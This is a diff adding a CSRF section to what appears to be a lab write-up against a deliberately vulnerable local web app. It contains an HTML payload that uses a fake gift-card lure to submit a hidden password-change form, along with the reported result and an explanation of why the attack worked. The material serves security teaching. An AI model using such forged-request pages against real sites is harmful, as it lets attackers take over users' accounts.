@@ -43,3 +43,32 @@ At High security, the application implements proper input validation using a whi
 
 **Explanation of why it failed at higher level:**
 At High security, the application implements proper input validation using a whitelist approach. It strictly validates that the input contains only characters that belong to a valid IP address format (numbers and dots). Any input containing special characters, letters, or shell metacharacters like semicolons (;) is rejected or sanitized before being passed to the system. This prevents command injection by ensuring only the intended IP address is processed by the ping command.
+
+
+## Cross Site Request Forgery (CSRF)
+
+### Security Level: Low
+
+**Payload Used:**
+```html
+<html>
+  <body>
+    <h1>Win a Free Gift Card!</h1>
+    <p>Click the button below to claim your $100 Amazon gift card:</p>
+    
+    <form action="http://localhost:8080/vulnerabilities/csrf/" method="GET">
+      <input type="hidden" name="password_new" value="attacker123" />
+      <input type="hidden" name="password_conf" value="attacker123" />
+      <input type="hidden" name="Change" value="Change" />
+      <input type="submit" value="Claim Your Gift Card!" />
+    </form>
+  </body>
+</html>
+
+**Result:** Success - The password was changed from "newpassword123" to "attacker123" without requiring the current password or any additional verification. The attack worked by simply getting the authenticated user to click a button on a malicious page.
+
+**Screenshot:**
+![CSRF - Low Security](screenshots/csrf-low.png)
+
+**Explanation of why it worked:**
+The application accepts password changes via GET requests with all parameters in the URL. It does not implement any anti-CSRF tokens, does not require the current password for verification, and relies solely on session cookies for authentication. When an authenticated user visits a malicious page, their browser automatically includes their session cookies with the forged request. The server sees a valid session and processes the password change request, unable to distinguish between a legitimate request from the actual user and a forged request from an attacker's site.
